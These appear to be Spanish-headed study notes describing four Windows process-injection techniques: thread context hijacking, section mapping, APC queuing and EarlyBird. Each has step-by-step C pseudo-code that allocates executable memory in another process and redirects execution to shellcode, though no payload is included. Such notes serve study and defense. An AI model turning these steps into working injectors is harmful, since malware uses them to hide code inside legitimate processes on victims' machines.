## Contexto del hilo

### Diagrama asociado a la inyección

### Pseudo-codigo

```c
// 1. open remote process and one of its threads
hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS,..., RemoteProcessID)
hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, ThreadID)

// 2. allocate memory buffer in remote process to store shellcode
pRemoteCode = VirtualAllocEx(hRemoteProcess,..., BufferSize,..., PAGE_EXECUTE_READWRITE)

// 3. write shellcode in remote memory buffer
WriteProcessMemory(hRemoteProcess, pRemoteCode, Shellcode, ShellcodeSize,...)

// 4. suspend the target thread and retrieve its full context
CONTEXT ctx
ctx.ContextFlags = CONTEXT_FULL
SuspendThread(hThread)
GetThreadContext(hThread, &ctx)

// 5. change the instruction pointer to point to our shellcode
ctx.Eip = pRemoteCode      // 32-bit process
ctx.Rip = pRemoteCode      // 64-bit process

// 6. set new context on the thread and resume it
SetThreadContext(hThread, &ctx)
ResumeThread(hThread)
```

## Secciones y vistas

### Diagrama asociado a la inyección

### Pseudo-codigo

```c
// 1. create new page-file-backed section (last parameter = NULL)
NtCreateSection(&hSection, ..., &payload_len, PAGE_EXECUTE_READWRITE, ..., NULL)

// 2. create section view in a local process
NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, ..., &payload_len, ...)

// 3. write shellcode into the section
memcpy(pLocalView, payload, payload_len)

// 4. create section view in a remote process (target)
NtMapViewOfSection(hSection, RemoteProc, &pRemoteView, ..., &payload_len, ..., PAGE_EXECUTE_READ)

// 5. execute shellcode in a remote process
RtlCreateUserThread(RemoteProc, ..., pRemoteView, 0, &hThread, &cid)
```

## Llamadas asincronas

### Diagrama asociado a la inyección

### Pseudo-codigo

```c
// 1. open handles to remote process and thread
hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS,..., RemoteProcessID)
hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, ThreadID)

// 2. allocate memory buffer in remote process to store shellcode
pRemoteCode = VirtualAllocEx(hRemoteProcess,..., BufferSize,..., PAGE_EXECUTE_READWRITE)

// 3. write shellcode in remote memory buffer
WriteProcessMemory(hRemoteProcess, pRemoteCode, Shellcode, ShellcodeSize,...)

// 4. execute shellcode in remote process by scheduling APC object in the thread's APC queue
QueueUserAPC(pRemoteCode, hThread, NULL)

// 5. ... and wait till the hThread enters alertable state (which is not guaranteed).
```

## EarlyBird

### Diagrama asociado a la inyección

### Pseudo-codigo

```c
// 1. create new process in suspended state
PROCESS_INFORMATION pi
CreateProcessA(0, "notepad.exe", ..., CREATE_SUSPENDED, ..., &pi)

// 2. allocate memory buffer in remote process to store shellcode
pRemoteCode = VirtualAllocEx(pi.hProcess,..., BufferSize,..., PAGE_EXECUTE_READWRITE)

// 3. write shellcode in remote memory buffer
WriteProcessMemory(pi.hProcess, pRemoteCode, Shellcode, ShellcodeSize,...)

// 4. execute shellcode in remote process via APC
QueueUserAPC(pRemoteCode, pi.hThread, NULL)

// 5. resume the main thread in remote process -> shellcode gets executed
ResumeThread(pi.hThread)
```
